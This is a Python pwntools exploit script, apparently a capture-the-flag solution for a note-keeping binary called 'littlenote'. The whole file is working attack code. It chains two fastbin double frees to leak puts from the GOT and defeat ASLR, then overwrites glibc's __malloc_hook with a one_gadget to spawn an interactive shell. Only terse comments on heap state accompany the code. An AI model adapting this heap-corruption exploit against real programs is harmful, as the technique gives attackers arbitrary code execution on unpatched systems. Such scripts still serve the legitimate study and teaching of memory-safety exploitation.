from pwn import *
context.log_level='debug'

p = process('./littlenote')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
sys_plt =  0x400760
stderr = 0x6020c0
puts_got = 0x602020
gadget=[0x45216,0x4526a]
def add(note,keep='y'):
	p.sendlineafter("Your choice:\n",'1')
	p.sendlineafter("Enter your note\n",note) #read
	p.sendlineafter("Want to keep your note?\n",keep)
	
def show(idx):
	p.sendlineafter("Your choice:\n",'2')
	p.sendlineafter("Which note do you want to show?\n",str(idx)) 

def free(idx):
	p.sendlineafter("Your choice:\n",'3')
	p.sendlineafter("Which note do you want to delete?\n",str(idx))	

add("0gur1")
add("1gur1")
free(0)		#fastbin->0
free(1)		#fastbin->1->0
add("2gur1",'N')#fastbin->1->0
free(0)		#fastbin->0->1->0

add(p64(stderr-0x3))#fastbin->1->0->stderr-0x3
add("4gur1")#fastbin->0->stderr-0x3
add("5gur1")#fastbin->stderr-0x3
add('a'*0x13+p64(puts_got))#note[0]=puts_got
show(0)

puts_addr = u64(p.recv(6).ljust(8,'\x00'))
log.info("puts_addr:%#x",puts_addr)
malloc_hook = puts_addr-(libc.symbols['puts']-libc.symbols['__malloc_hook'])
log.info("malloc_hook:%#x",malloc_hook)
one_gadget = puts_addr - libc.symbols['puts']+gadget[1]
add("7gur1")
add("8gur1")
free(7)		#fastbin->7
free(8)		#fastbin->8->7
add("9gur1",'N')#fastbin->8->7
free(7)		#fastbin->7->8->7	

add(p64(malloc_hook-0x23))#fastbin->8->7->malloc_hook-0x23
add("agur1")#fastbin->7->malloc_hook-0x23
add("bgur1")#fastbin->malloc_hook-0x23
add(0x13*'a'+p64(one_gadget))
#gdb.attach(p)

p.sendlineafter("Your choice:\n",'1')
p.interactive()
